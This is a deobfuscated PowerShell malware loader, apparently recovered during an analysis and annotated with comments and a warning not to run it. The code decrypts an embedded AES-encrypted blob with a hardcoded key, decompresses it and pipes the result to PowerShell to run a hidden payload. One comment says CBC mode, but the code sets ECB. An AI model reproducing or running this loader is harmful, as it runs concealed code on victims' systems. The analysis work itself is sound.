# Deobfuscated with ❤️ from Malware Guy - do not run on your system!
# Located within stream 3, after dumping the commandline args from CreateProcessA
$base64_encoded_pwsh = 'AAAAAAAAAAAAAAAAAAAAAF7kyAS4yZ7C/VodsuAEAAwAbVIHNc/ewRgRDsQz/jLII5H2LTau7xCaQAwu/H77xyfEBLBmXIQOFBC6nlMfsu6s+Xry8dmP9Nr8Ye37O7mBf3TBXvaKIVvcFDiChyKs512vnXdK3bI2J+KM+VqoMj3loXi58Lrk+CdYkNAGLihUdYmwISnDVg+k22EVKX8tP1ylw1xsfeqpkNEC8OMExRc9BR7prVpWBi98MyNqk07bPTvsJbyiI33jdruovGp3Qn8U40/odmz6t3CPxXmawf2qxT22616YS2iQx/LvN3+mQsH6n+0f8+4LWICoZ4dAMYdgQOeXDKdv/xgMQp49x/tN7kk4ZzhQSzMDd8+3GzXXpD+LRN0KmgERlMDSfKJduXgoIOPxudL5hFfY2kacJs5TwVarzTHd7uMxTzQokRfgiq9Zw5SG3++k47scP4b9MRRSRJzqdh1/EDkWAHJ/f/BqtZBuNO8hyp5nIn7iWSJgI4Q/BtzJUiOS+mNKyrF/h6OH5rCCysWMk20BY0Hg97KvZhm4xrXYQwVFobJ5+vQd0JEqzjKOizyVTSFIjQWwZiDfZW6hkWQwmNUR6mZPJWHqvLZ5avPqzs9QFsR4QiImZmoZEY7RUcN3+GBXirgAEFKaduoPJSXFyCWyp3UWS6bWKrXbXBk/7ndi1VN0MvuwgsttRZin1/uUru2jJDIlngqycpTpOJH2ZM7RWcpuJZHsuIpBzjkknedTk6zz4GHm4r6rzY+0ikREOmentjfQsAjTgzy6Hlqj0GaY0CAjqFGTJm2kDkX+V4J2Yagny0mCMz/tf9GgLHkbSeNaotgPUmJKF9d578iBbOYJH8SzBSC1Q1WH1cffAHbERhtkCvVZTgZjDsB4xB4n/SmjCa7EE9zSrDi2/RpSlUMTefXK4kX4uQ9JYAHEVmvwLykge/ZY';

# Set up AES decryption using CBC mode and decrypt the above variable
$aes_key = 'cFZSUmZzSGlqa3RNZmlEeVB3a1ZzRHlIT0pOUnBFU1Y=';
$aESDecryptionProvider = New-Object 'System.Security.Cryptography.AesManaged';
$aESDecryptionProvider.Mode = [System.Security.Cryptography.CipherMode]::ECB;
$aESDecryptionProvider.Padding = [System.Security.Cryptography.PaddingMode]::Zeros;
$aESDecryptionProvider.BlockSize = 128;
$aESDecryptionProvider.KeySize = 256;
$aESDecryptionProvider.Key = [System.Convert]::FromBase64String($aes_key); # pVRRfsHijktMfiDyPwkVsDyHOJNRpESV
$decoded_pwsh = [System.Convert]::FromBase64String($base64_encoded_pwsh);
$initialisation_vector = $decoded_pwsh[0..15]; # The first 16 characters of the decoded PowerShell command is used as the initialisation vector
$aESDecryptionProvider.IV = $initialisation_vector;
$aesDecryptor = $aESDecryptionProvider.CreateDecryptor();
$final_block = $aesDecryptor.TransformFinalBlock($decoded_pwsh, 16, $decoded_pwsh.Length - 16);
$aESDecryptionProvider.Dispose();
$memorystream1 = New-Object System.IO.MemoryStream( , $final_block );
$memorystream2 = New-Object System.IO.MemoryStream;

# After decryption, decompress the PowerShell script and execute it
$gzip_decompressed_pwsh = New-Object System.IO.Compression.GzipStream $memorystream1, ([IO.Compression.CompressionMode]::Decompress);
$gzip_decompressed_pwsh.CopyTo( $memorystream2 );
$gzip_decompressed_pwsh.Close();
$memorystream1.Close();
[byte[]] $ps_cmd_bytes = $memorystream2.ToArray();
$ps_cmd = [System.Text.Encoding]::UTF8.GetString($ps_cmd_bytes);
$ps_cmd | powershell -
